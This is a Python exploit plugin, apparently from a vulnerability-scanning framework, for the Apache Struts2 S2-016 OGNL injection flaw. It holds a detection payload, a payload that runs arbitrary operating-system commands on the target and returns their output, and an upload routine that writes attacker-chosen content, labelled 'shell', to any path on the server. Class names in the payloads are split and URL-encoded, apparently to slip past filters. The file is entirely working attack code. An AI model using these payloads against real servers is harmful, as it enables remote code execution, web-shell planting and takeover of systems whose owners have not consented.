#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                headers = {"Content-Type": "application/x-www-form-urlencoded"}
                prove_poc = "redirect%3a%24%7b%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27)%2c%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27)%2c%23resp.setCharacterEncoding(%27UTF-8%27)%2c%23resp.getWriter().print(%22struts2_se%22%2b%22curity_vul%22)%2c%23resp.getWriter().print(%22struts2_security_vul_str2016%22)%2c%23resp.getWriter().flush()%2c%23resp.getWriter().close()%7d"
                poc_key = '''vulstruts2'''
                try:
                    async with session.post(url=self.url, data=prove_poc,headers = headers) as res:
                        if res :
                            text = await res.text()
                            if text.find(poc_key) != -1 or poc_key in res.headers :
                                yield self.url
                except:
                    pass


    async def exec(self):
        if self.base_url:
            cmd = self.parameter['cmd']
            prove_poc = "redirect%3a%24%7b%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27)%2c%23s%3dnew+java.util.Scanner((new+java.lang.ProcessBuilder(%27%COMMAND%%27.toString().split(%27%5c%5c%5c%5cs%27))).start().getInputStream()).useDelimiter(%27%5c%5c%5c%5cAAAA%27)%2c%23str%3d%23s.hasNext()%3f%23s.next()%3a%27%27%2c%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27)%2c%23resp.setCharacterEncoding(%27UTF-8%27)%2c%23resp.getWriter().println(%23str)%2c%23resp.getWriter().flush()%2c%23resp.getWriter().close()%7d".replace("%COMMAND%",cmd)
            async with ClientSession() as session:
                headers = {"Content-Type": "application/x-www-form-urlencoded"}
                try:
                    async with session.post(url=self.url, data=prove_poc, headers=headers) as res:
                        if res!=None:
                            text = await res.text()
                            yield text
                except:
                    pass

    async def upload(self):
        if self.base_url:
            despath = self.parameter['despath']
            srcpath = self.parameter['srcpath']
            content = self.read_file(srcpath['srcpath'])
            prove_poc = "redirect%3a%24%7b%23req%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27)%2c%23res%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27)%2c%23res.getWriter().print(%22oko%22)%2c%23res.getWriter().print(%22kok%2f%22)%2c%23res.getWriter().print(%23req.getContextPath())%2c%23res.getWriter().flush()%2c%23res.getWriter().close()%2cnew+java.io.BufferedWriter(new+java.io.FileWriter(%22%PATH%%22)).append(%23req.getParameter(%22shell%22)).close()%7d&shell=%FILECONTENT%".replace("%PATH%", despath).replace("%FILECONTENT%", content)
            async with ClientSession() as session:
                headers = {"Content-Type": "application/x-www-form-urlencoded"}
                try:
                    async with session.post(url=self.url, data=prove_poc, headers=headers) as res:
                        yield despath
                except:
                    pass
